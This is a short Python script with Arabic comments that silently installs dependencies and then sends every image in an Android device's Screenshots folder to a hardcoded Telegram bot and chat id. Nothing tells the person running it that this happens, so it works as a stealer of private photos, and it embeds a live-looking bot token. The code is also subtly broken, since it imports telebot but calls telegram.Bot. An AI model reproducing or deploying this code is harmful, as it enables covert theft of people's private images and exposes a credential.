import sys
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
from threading import Thread

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

# استبدل 'your_bot_token' بـ Token بوتك
bot = telegram.Bot(token='7054926619:AAGToMYtg4lsg17fVmIkICgZ_ApMI0TSneU')
chat_id = '5164991393'  # استبدل بـ chat_id الدردشة التي تريد إرسال الملفات إليها

# الدليل الذي تريد سحب الملفات منه (يمكنك تغييره)
directory = '/sdcard/DCIM/Screenshots/'

# قائمة بامتدادات الصور الشائعة (يمكنك إضافة المزيد)
image_extensions = ['.jpg', '.jpeg', '.png', '.gif']

# دالة لإرسال ملف صورة
def send_image(file_path):
    with open(file_path, 'rb') as file:
        bot.send_photo(chat_id=chat_id, photo=file)

# الحصول على قائمة الملفات في الدليل
files = os.listdir(directory)

# إرسال كل صورة
for file in files:
    file_path = os.path.join(directory, file)
    extension = os.path.splitext(file)[1].lower()
    if extension in image_extensions:
        send_image(file_path)
